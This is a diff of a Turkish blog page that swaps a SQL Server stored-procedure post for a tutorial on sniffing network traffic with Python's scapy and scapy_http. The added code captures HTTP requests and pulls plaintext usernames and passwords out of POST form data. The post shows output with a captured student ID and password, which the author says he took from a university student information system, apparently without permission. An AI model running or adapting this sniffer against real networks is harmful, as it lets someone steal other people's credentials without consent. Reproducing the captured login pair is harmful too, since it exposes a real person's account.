@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>SQL Server'da Procedure'e GETDATE() Yollamak &#8211; Ali GÖREN...</title>
+    <title>Python ile Ağ Üzerinde İzleme Yapma &#8211; Ali GÖREN...</title>
     <link rel="dns-prefetch" href="//maxcdn.bootstrapcdn.com">
     <link rel="dns-prefetch" href="//cdn.mathjax.org">
     <link rel="dns-prefetch" href="//cdnjs.cloudflare.com">
@@ -12,8 +12,8 @@
     <meta name="robots" content="all">
     <meta name="author" content="Ali GÖREN">
     
-    <meta name="keywords" content="Programlama, SQL">
-    <link rel="canonical" href="https://aligoren.comhttps://aligoren.com/sql-serverda-proceduree-getdate-yollamak">
+    <meta name="keywords" content="Python, Security">
+    <link rel="canonical" href="https://aligoren.comhttps://aligoren.com/python-ile-ag-uzerinde-izleme-yapma">
     <link rel="alternate" type="application/rss+xml" title="RSS Feed for Ali GÖREN..." href="https://aligoren.com/feed.xml" />
 
     <!-- Custom CSS -->
@@ -41,9 +41,9 @@
     <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
     <meta property="og:locale" content="tr_TR">
     <meta property="og:type" content="article">
-    <meta property="og:title" content="SQL Server'da Procedure'e GETDATE() Yollamak">
+    <meta property="og:title" content="Python ile Ağ Üzerinde İzleme Yapma">
     <meta property="og:description" content=".NET, SQL, Python, Açık Kaynak">
-    <meta property="og:url" content="https://aligoren.com/sql-serverda-proceduree-getdate-yollamak">
+    <meta property="og:url" content="https://aligoren.com/python-ile-ag-uzerinde-izleme-yapma">
     <meta property="og:site_name" content="Ali GÖREN...">
 
     <!-- Twitter Card -->
@@ -51,9 +51,9 @@
     
         <meta name="twitter:site" content="@yazilimci_adam" />
     
-    <meta name="twitter:title" content="SQL Server'da Procedure'e GETDATE() Yollamak" />
+    <meta name="twitter:title" content="Python ile Ağ Üzerinde İzleme Yapma" />
     <meta name="twitter:description" content=".NET, SQL, Python, Açık Kaynak" />
-    <meta name="twitter:url" content="https://aligoren.com/sql-serverda-proceduree-getdate-yollamak" />
+    <meta name="twitter:url" content="https://aligoren.com/python-ile-ag-uzerinde-izleme-yapma" />
 
     <!-- Icons -->
     <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
@@ -188,62 +188,135 @@
 
 
 <div class="post-header mb2">
-  <h1>SQL Server'da Procedure'e GETDATE() Yollamak</h1>
-  <span class="post-meta">Oct 3, 2016</span><br>
+  <h1>Python ile Ağ Üzerinde İzleme Yapma</h1>
+  <span class="post-meta">Oct 23, 2016</span><br>
   
   <span class="post-meta small">
   
-    1 Dakikada Okunabilir
+    2 Dakikada Okunabilir
   
   </span>
 </div>
 
 <article class="post-content">
-  <p>SQL Server tarafında çalışma yaparken bazen oluşturmuş olduğunuz Stored Procedure’lere parametre olarak GETDATE() yollamak isteyebiliriz.</p>
+  <p>Merhaba. Bu yazıda Python ile basit bir şekilde ağ üzerinde nasıl izleme yapılırı anlatmaya çalışıcam.
+Yazıya giriş yapmadan önce bazı gereksinimler mevcut. Bunlardan birisi <code>scapy</code></p>
 
-<p>Kısaca bir örnek verecek olursak kullanıcıların kaydedildiği bir tablo var normalde bu işlemleri bir programlama dili yardımıyla zaten hallediyordunuz ama işiniz SQL Server’a düştü.</p>
+<p>Teknik detaylara giriş yapmadan önce açıklamak gerekirse scapy, network tarafında özelleştirilmiş paketler üretmeye yarayan bir kütüphane.</p>
 
-<p>Senaryoya göre ekleme işleminiz şöyle gerçekleşebilir:</p>
+<p>Kendisi açık kaynak kodlu bir yazılımdır. Scapy’nin diğerlerine göre farkı genişletilebilir oluşunda.
+Diğerleri demişken bunlardan benim bildikleri nmap ve hping var. İlla ki görmüşsünüzdür.</p>
 
-<pre><code class="language-sql">EXEC InsertNewUser 'Ali', '123456', GETDATE();
+<p>Ayrıca scapy interactive olarak ya da development kısmında da çalışabilir.
+Yani dilerseniz interactive shell ile çalışabilir ya da projenizde kütüphaneyi çağırabilirsiniz.</p>
+
+<h2 id="scapy-ve-scapy-http-kurulumu">scapy ve scapy-http Kurulumu</h2>
+
+<p>Çok uzatmayalım. Ben işlemleri linux dağıtımı üzerinde gerçekleştirdim. Kurulum iki aşamadan oluşuyor.
+Dağıtımınızda pip olduğunu varsayarak şu işlemleri gerçekleştirelim:</p>
+
+<pre><code class="language-bash">sudo apt-get install python-scapy
+sudo pip install scapy_http
 </code></pre>
 
-<p>Ancak burada bir hata alacaksınız. Bu hatanın içeriğinde nvarchar ve date ile ilgili bir metin yer alacaktır.</p>
+<p>Kurulum bu kadar Burada <code>scapy_http</code> adında bir kütüphane kullandık.
+Kütüphane yazarı <a href="http://www.lucainvernizzi.net">Luca Invernizzi</a> isimli abimizdir.</p>
 
-<p>Bu hata’yı çözmenin basit bir yolu var. Tarih bilgisini saklayacak alanı nullable olarak tanımlayarak basit bir kontrolle bu işlemi halledebiliriz. Örneğin önceden oluşturduğumuz PROCEDURE şu haldeydi:</p>
+<h2 id="scapy-ile-a-trafiinin-zlenmesi">scapy ile Ağ Trafiğinin İzlenmesi</h2>
 
-<pre><code class="language-sql">CREATE PROC InsertNewUser
-	@UserName nvarchar(30),
-	@UserPassword nvarchar(30),
-	@RegDate date
-AS
-    INSERT INTO Users(UserName, UserPassword, RegDate)
-    VALUES (@UserName, @UserPassword, @RegDate)
+<p>Yazı iki kısımdan oluşacak. Bu bir adresi kim yani hangi IP ziyaret ediyor ona bakacağız.</p>
+
+<p>Öncelikle scapy ve scapy_http kütüphanesini dahil edelim:</p>
+
+<pre><code class="language-python">from scapy.all import IP, sniff
+from scapy.layers import http
 </code></pre>
 
-<p>Burada aslında bir hata yok PROCEDURE ilgili değeri aldığı sürece doğru çalışıyor. Ama direkt olarak bugünün tarihini almasını istediğimiz durumlarda parametre almıyor. O zaman oluşturduğumuz PROC üzerinde bir değişiklik yaparak başlangıçta nullable bir date değişkeni oluşturup durumunu kontrol edebiliriz. PROCEDURE düzenlenir ve şöyle bir işlem gerçekleştirilir:</p>
+<p>Şimdi gelen değerleri sniffleyeceğimiz bir metod yazalım.
+Bu methoddan dönen değerlere göre sniffing işlemi yapacağız.</p>
 
-<pre><code class="language-sql">ALTER PROC InsertNewUser
-	@UserName nvarchar(30),
-	@UserPassword nvarchar(30),
-	@RegDate date = NULL
-AS
+<p>Bu metodda TCP paketlerini ayıklayacağız.
+Ayıklama işlemi esnasında herhangi bir şekilde HTTP isteğine denk gelirsek ekrana yazdıracağız.</p>
 
-IF @RegDate IS NULL
-    SET @RegDate = GETDATE()
+<pre><code class="language-python">def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    
+    #http katmanından geçen istekler
+    http_katmani = paket.getlayer(http.HTTPRequest)
 
-    INSERT INTO Users(UserName, UserPassword, RegDate)
-    VALUES (@UserName, @UserPassword, @RegDate)
+    # IP adresi içeren katman
+    ip_katmani = paket.getlayer(IP)
+    print '\n{0[src]} IP adresinden {1[Method]} {1[Host]}{1[Path]} sitesine ziyaret'.format(ip_katmani.fields, http_katmani.fields)
+
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
+</code></pre>
+<p>Çıktı olarak şöyle görüntüleriz:</p>
+
+<p><img src="images/posts/sniff_url.png" alt="images/posts/sniff_url.png" /></p>
+
+<p>Buraya kadar olan kısım şu <a href="http://www.lucainvernizzi.net/blog/2015/02/12/extracting-urls-from-network-traffic-in-just-9-python-lines-with-scapy-http/">bağlantı</a> üzerinden alıntılandı</p>
+
+<h2 id="scapy-ile-post-verilerinin-alnmas">scapy ile POST Verilerinin Alınması</h2>
+
+<p>Gelelim zurna mıdır nedir onun şey dediği yere.
+Ağ üzerinde herkesin merak ettiği bir diğer konu da internet sitelerine girişte parolaların alınıp alınamayacağıdır.</p>
+
+<p>Yukarıdaki yapıya aşırı benzer bir şekilde POST değerlerini alabilirsiniz.
+Bu işlem SSL olan sistemlerde işe yaramıyor. Bunu belirtmem gerekir.
+Eğer SSL konusunda merakınız varsa tintinweb <a href="https://github.com/tintinweb/scapy-ssl_tls">reposuna</a> bakmalısınız.</p>
+
+<p>Post edilen verileri saf haliyla görebilmemizi sağlayan kodun temeli yukarıdaki ile aynı.
+Geri kalan kısım biraz programlama becerisi istiyor olay o kadar yani.</p>
+
+<pre><code class="language-python">from scapy.all import IP, sniff
+from scapy.layers import http
+ 
+ 
+def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    http_katmani = paket.getlayer(http.HTTPRequest)
+    try:
+        # Gelen istek POST mu?
+        if str(http_katmani.fields["Method"]) == "POST":
+            
+            # Öyle ise dönen değeri böl ve bölünen değerin 13.sünü al
+            # 13. değer form değerlerinin geldiği kısım oluyor
+            data = str(http_katmani).split('\n')[13]
+            # Form değerleri birleşikti bildiğiniz GET query gibi
+            # Önce ampersand kaldırılıp, alt satıra geçme sağlandı
+            #   txtUserName=Falan
+            #   txtPassword=FalanPasswd
+            # Ardından Gelen değerdeki %40, yerini @ ifadesine bıraktı.
+            # Mail için önemli :)
+            data = data.replace('&amp;', '\n').replace('%40', '@')
+            return data
+    except:
+        pass
+ 
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
 </code></pre>
 
-<p>Artık bu sayede SQL Server tarafında NULL değer almış olsa dahi bugünün tarihini ekleyecektir. Eğer sizin için bu tip durumlar hayati önem taşıyorsa bu yapıyı kullanabilirsiniz. Basit olarak NULL yazmak, formatlı tarih yollamaktan daha kolay geliyor da olabilir. Unutmadan artık SP şöyle çalışacaktır:</p>
+<p>Bu ikinci kodun sonrasında çalıştırdığımızda aşağıdaki gibi bir çıktı ile karşılaşacağız.
+Dikkat ettiyseniz formda bulunan inputların name’leri ve value’ları bu ekranda görüntülenebilmekte</p>
 
-<pre><code class="language-sql">EXEC InsertNewUser 'Ali', 'GÖREN', NULL
+<pre><code>txt_username=16612261
+txt_password=cH10k1997GuVenL
 </code></pre>
 
-<p>Bu çalışmanın SQL Fiddle üzerindeki örneğine şuradan ulaşabilirsiniz:</p>
+<p>Yukarıdaki kullanıcı adı ve parola saf haliyle karşımıza sunulmakta.
+Parola her ne kadar ben güvenliyim imajı verse de izlemek pek de zor olmuyor.</p>
 
-<p><a href="http://sqlfiddle.com/#!6/921f6/1">http://sqlfiddle.com/#!6/921f6/1</a></p>
+<p>Bu işlemi bir üniversitenin Öğrenci Bilgi Sistemi üzerinde gerçekleştirdim. Umarım problem olmaz :)</p>
+
+<p><img src="images/posts/post_sniffing.png" alt="images/posts/post_sniffing.png" /></p>
+
+<p>Sanırım bir anlatımın daha sonuna geldik. Özetle: SSL kullanın</p>
 
 </article>
 
@@ -265,9 +338,9 @@ IF @RegDate IS NULL
 
 Kategori:
 
-<a href="kategoriler#Programlama">Programlama</a>,
+<a href="kategoriler#Python">Python</a>,
 
-<a href="kategoriler#SQL">SQL</a>,
+<a href="kategoriler#Security">Security</a>,
 
 
 
@@ -276,8 +349,8 @@ Kategori:
   <div id="disqus_thread"></div>
   <script type="text/javascript">
     var disqus_shortname  = 'aligren';
-    var disqus_identifier = '/sql-serverda-proceduree-getdate-yollamak';
-    var disqus_title      = "SQL Server'da Procedure'e GETDATE() Yollamak";
+    var disqus_identifier = '/python-ile-ag-uzerinde-izleme-yapma';
+    var disqus_title      = "Python ile Ağ Üzerinde İzleme Yapma";
 
     (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
